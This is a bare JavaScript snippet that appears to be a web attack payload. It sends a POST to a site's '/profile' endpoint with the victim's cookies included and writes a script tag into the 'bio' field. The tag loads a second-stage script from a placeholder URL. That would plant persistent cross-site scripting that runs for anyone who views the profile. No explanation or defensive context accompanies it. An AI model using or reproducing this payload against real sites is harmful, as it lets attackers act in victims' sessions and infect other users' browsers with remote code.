fetch('/profile', {
    method: 'POST',
    credentials: 'include',
    body: (function(){
        var fd = new FormData();
        fd.append('bio', '<script src="__STAGE2_URL__"></script>');
        return fd;
    })()
});
